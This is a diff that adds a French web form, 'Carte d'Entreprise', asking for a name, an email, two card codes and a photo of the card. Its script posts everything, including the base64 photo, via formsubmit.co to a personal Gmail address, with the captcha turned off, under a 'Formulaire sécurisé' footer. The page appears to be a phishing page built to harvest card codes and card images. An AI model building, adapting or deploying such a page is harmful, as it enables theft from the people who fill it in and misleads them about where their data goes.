@@ -1,0 +1,586 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulaire Carte d'Entreprise</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: #ffffff;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            width: 100%;
+            max-width: 600px;
+            overflow: hidden;
+            animation: slideUp 0.6s ease-out;
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .header {
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            color: white;
+            padding: 40px 30px;
+            text-align: center;
+            position: relative;
+        }
+
+        .header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 5px;
+            background: linear-gradient(90deg, #ff6b6b, #feca57, #48dbfb, #ff9ff3);
+        }
+
+        .header h1 {
+            font-size: 28px;
+            margin-bottom: 10px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+        }
+
+        .header p {
+            font-size: 14px;
+            opacity: 0.9;
+            font-weight: 300;
+        }
+
+        .header .icon {
+            font-size: 50px;
+            margin-bottom: 15px;
+            display: block;
+        }
+
+        .form-body {
+            padding: 40px 30px;
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+            font-weight: 600;
+            font-size: 14px;
+            letter-spacing: 0.3px;
+        }
+
+        .form-group label .required {
+            color: #e74c3c;
+            margin-left: 3px;
+        }
+
+        .form-group input[type="text"],
+        .form-group input[type="email"] {
+            width: 100%;
+            padding: 14px 18px;
+            border: 2px solid #e1e8ed;
+            border-radius: 10px;
+            font-size: 15px;
+            transition: all 0.3s ease;
+            background: #f8fafc;
+        }
+
+        .form-group input[type="text"]:focus,
+        .form-group input[type="email"]:focus {
+            outline: none;
+            border-color: #2a5298;
+            background: #fff;
+            box-shadow: 0 0 0 4px rgba(42, 82, 152, 0.1);
+        }
+
+        .form-group input::placeholder {
+            color: #a0aec0;
+        }
+
+        .codes-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+        }
+
+        .code-input-wrapper {
+            position: relative;
+        }
+
+        .code-input-wrapper .code-icon {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 18px;
+            color: #2a5298;
+        }
+
+        .code-input-wrapper input {
+            padding-left: 45px !important;
+            letter-spacing: 2px;
+            font-weight: 600;
+            text-transform: uppercase;
+        }
+
+        .upload-area {
+            border: 2px dashed #cbd5e0;
+            border-radius: 12px;
+            padding: 35px 20px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            background: #f8fafc;
+            position: relative;
+        }
+
+        .upload-area:hover {
+            border-color: #2a5298;
+            background: #edf2f7;
+        }
+
+        .upload-area.dragover {
+            border-color: #2a5298;
+            background: #e8f0fe;
+            transform: scale(1.02);
+        }
+
+        .upload-area input[type="file"] {
+            display: none;
+        }
+
+        .upload-icon {
+            font-size: 40px;
+            color: #2a5298;
+            margin-bottom: 10px;
+        }
+
+        .upload-text {
+            color: #4a5568;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .upload-text span {
+            color: #2a5298;
+            font-weight: 700;
+        }
+
+        .upload-hint {
+            color: #a0aec0;
+            font-size: 12px;
+            margin-top: 5px;
+        }
+
+        .preview-container {
+            display: none;
+            margin-top: 15px;
+            position: relative;
+        }
+
+        .preview-container img {
+            max-width: 100%;
+            max-height: 200px;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            display: block;
+            margin: 0 auto;
+        }
+
+        .preview-container .remove-btn {
+            position: absolute;
+            top: -10px;
+            right: -10px;
+            background: #e74c3c;
+            color: white;
+            border: none;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            cursor: pointer;
+            font-size: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 2px 10px rgba(231, 76, 60, 0.4);
+            transition: all 0.2s;
+        }
+
+        .preview-container .remove-btn:hover {
+            background: #c0392b;
+            transform: scale(1.1);
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            letter-spacing: 0.5px;
+            margin-top: 10px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .submit-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(42, 82, 152, 0.4);
+        }
+
+        .submit-btn:active {
+            transform: translateY(0);
+        }
+
+        .submit-btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .submit-btn .spinner {
+            display: none;
+            width: 18px;
+            height: 18px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-right: 10px;
+            vertical-align: middle;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .alert {
+            padding: 15px 20px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            display: none;
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .alert.success {
+            background: #d4edda;
+            color: #155724;
+            border-left: 4px solid #28a745;
+        }
+
+        .alert.error {
+            background: #f8d7da;
+            color: #721c24;
+            border-left: 4px solid #dc3545;
+        }
+
+        .footer {
+            text-align: center;
+            padding: 20px;
+            background: #f8fafc;
+            color: #a0aec0;
+            font-size: 12px;
+            border-top: 1px solid #e1e8ed;
+        }
+
+        @media (max-width: 480px) {
+            .codes-row {
+                grid-template-columns: 1fr;
+            }
+            .header {
+                padding: 30px 20px;
+            }
+            .form-body {
+                padding: 30px 20px;
+            }
+            .header h1 {
+                font-size: 22px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <span class="icon">🏢</span>
+            <h1>Carte d'Entreprise</h1>
+            <p>Enregistrement des informations de la carte professionnelle</p>
+        </div>
+
+        <div class="form-body">
+            <div id="alert" class="alert"></div>
+
+            <form id="companyCardForm" enctype="multipart/form-data">
+                <div class="form-group">
+                    <label for="fullname">Nom complet <span class="required">*</span></label>
+                    <input type="text" id="fullname" name="fullname" placeholder="Entrez votre nom complet" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="email">Adresse email <span class="required">*</span></label>
+                    <input type="email" id="email" name="email" placeholder="exemple@entreprise.com" required>
+                </div>
+
+                <div class="form-group">
+                    <label>Informations de la carte</label>
+                    <div class="codes-row">
+                        <div class="code-input-wrapper">
+                            <span class="code-icon">🔑</span>
+                            <input type="text" id="code1" name="code1" placeholder="Code 1" required>
+                        </div>
+                        <div class="code-input-wrapper">
+                            <span class="code-icon">🔑</span>
+                            <input type="text" id="code2" name="code2" placeholder="Code 2" required>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label>Photo de la carte <span class="required">*</span></label>
+                    <div class="upload-area" id="uploadArea">
+                        <input type="file" id="cardPhoto" name="cardPhoto" accept="image/*" required>
+                        <div id="uploadContent">
+                            <div class="upload-icon">📷</div>
+                            <div class="upload-text">Cliquez ou glissez l'image <span>ici</span></div>
+                            <div class="upload-hint">Formats acceptés : JPG, PNG, GIF (max 5 Mo)</div>
+                        </div>
+                        <div class="preview-container" id="previewContainer">
+                            <img id="previewImage" src="" alt="Aperçu de la carte">
+                            <button type="button" class="remove-btn" id="removeBtn" title="Supprimer">×</button>
+                        </div>
+                    </div>
+                </div>
+
+                <button type="submit" class="submit-btn" id="submitBtn">
+                    <span class="spinner" id="spinner"></span>
+                    <span id="btnText">📤 Envoyer le formulaire</span>
+                </button>
+            </form>
+        </div>
+
+        <div class="footer">
+            © 2024 - Tous droits réservés | Formulaire sécurisé
+        </div>
+    </div>
+
+    <script>
+        // Configuration
+        const RECIPIENT_EMAIL = 'cmorgane024@gmail.com';
+        const FORM_ENDPOINT = `https://formsubmit.co/ajax/${RECIPIENT_EMAIL}`;
+
+        // Éléments DOM
+        const form = document.getElementById('companyCardForm');
+        const uploadArea = document.getElementById('uploadArea');
+        const fileInput = document.getElementById('cardPhoto');
+        const uploadContent = document.getElementById('uploadContent');
+        const previewContainer = document.getElementById('previewContainer');
+        const previewImage = document.getElementById('previewImage');
+        const removeBtn = document.getElementById('removeBtn');
+        const submitBtn = document.getElementById('submitBtn');
+        const btnText = document.getElementById('btnText');
+        const spinner = document.getElementById('spinner');
+        const alertBox = document.getElementById('alert');
+
+        let selectedFile = null;
+
+        // Gestion du clic sur la zone d'upload
+        uploadArea.addEventListener('click', (e) => {
+            if (e.target !== removeBtn && !previewContainer.contains(e.target)) {
+                fileInput.click();
+            }
+        });
+
+        // Drag & Drop
+        uploadArea.addEventListener('dragover', (e) => {
+            e.preventDefault();
+            uploadArea.classList.add('dragover');
+        });
+
+        uploadArea.addEventListener('dragleave', () => {
+            uploadArea.classList.remove('dragover');
+        });
+
+        uploadArea.addEventListener('drop', (e) => {
+            e.preventDefault();
+            uploadArea.classList.remove('dragover');
+            const files = e.dataTransfer.files;
+            if (files.length > 0) {
+                handleFile(files[0]);
+            }
+        });
+
+        // Sélection de fichier
+        fileInput.addEventListener('change', (e) => {
+            if (e.target.files.length > 0) {
+                handleFile(e.target.files[0]);
+            }
+        });
+
+        function handleFile(file) {
+            // Validation du type
+            if (!file.type.startsWith('image/')) {
+                showAlert('Veuillez sélectionner un fichier image valide.', 'error');
+                return;
+            }
+            // Validation de la taille (5 Mo)
+            if (file.size > 5 * 1024 * 1024) {
+                showAlert('Le fichier est trop volumineux (max 5 Mo).', 'error');
+                return;
+            }
+
+            selectedFile = file;
+            const reader = new FileReader();
+            reader.onload = (e) => {
+                previewImage.src = e.target.result;
+                uploadContent.style.display = 'none';
+                previewContainer.style.display = 'block';
+            };
+            reader.readAsDataURL(file);
+        }
+
+        // Suppression de l'aperçu
+        removeBtn.addEventListener('click', (e) => {
+            e.stopPropagation();
+            selectedFile = null;
+            fileInput.value = '';
+            previewContainer.style.display = 'none';
+            uploadContent.style.display = 'block';
+            previewImage.src = '';
+        });
+
+        // Soumission du formulaire
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            // Validations
+            const fullname = document.getElementById('fullname').value.trim();
+            const email = document.getElementById('email').value.trim();
+            const code1 = document.getElementById('code1').value.trim();
+            const code2 = document.getElementById('code2').value.trim();
+
+            if (!fullname || !email || !code1 || !code2) {
+                showAlert('Veuillez remplir tous les champs obligatoires.', 'error');
+                return;
+            }
+
+            if (!selectedFile) {
+                showAlert('Veuillez uploader la photo de la carte.', 'error');
+                return;
+            }
+
+            // Préparer les données
+            const formData = new FormData();
+            formData.append('Nom complet', fullname);
+            formData.append('Email', email);
+            formData.append('Code 1', code1);
+            formData.append('Code 2', code2);
+            formData.append('_subject', 'Nouvelle Carte d\'Entreprise - ' + fullname);
+            formData.append('_template', 'table');
+            formData.append('_captcha', 'false');
+
+            // Convertir l'image en base64 pour l'envoi
+            const base64Image = await fileToBase64(selectedFile);
+            formData.append('Photo de la carte', base64Image);
+            formData.append('Nom du fichier', selectedFile.name);
+
+            // UI: chargement
+            setLoading(true);
+
+            try {
+                const response = await fetch(FORM_ENDPOINT, {
+                    method: 'POST',
+                    body: formData,
+                    headers: {
+                        'Accept': 'application/json'
+                    }
+                });
+
+                const data = await response.json();
+
+                if (response.ok) {
+                    showAlert('✅ Formulaire envoyé avec succès ! Nous vous contacterons bientôt.', 'success');
+                    form.reset();
+                    removeBtn.click();
+                } else {
+                    throw new Error(data.message || 'Erreur lors de l\'envoi');
+                }
+            } catch (error) {
+                console.error('Erreur:', error);
+                showAlert('❌ Une erreur est survenue. Veuillez réessayer ou nous contacter directement.', 'error');
+            } finally {
+                setLoading(false);
+            }
+        });
+
+        // Conversion en base64
+        function fileToBase64(file) {
+            return new Promise((resolve, reject) => {
+                const reader = new FileReader();
+                reader.onload = () => resolve(reader.result);
+                reader.onerror = reject;
+                reader.readAsDataURL(file);
+            });
+        }
+
+        // Afficher alerte
+        function showAlert(message, type) {
+            alertBox.textContent = message;
+            alertBox.className = 'alert ' + type;
+            alertBox.style.display = 'block';
+            setTimeout(() => {
+                alertBox.style.display = 'none';
+            }, 6000);
+        }
+
+        // État de chargement
+        function setLoading(isLoading) {
+            submitBtn.disabled = isLoading;
+            if (isLoading) {
+                spinner.style.display = 'inline-block';
+                btnText.textContent = 'Envoi en cours...';
+            } else {
+                spinner.style.display = 'none';
+                btnText.textContent = '📤 Envoyer le formulaire';
+            }
+        }
+    </script>
+</body>
+</html>
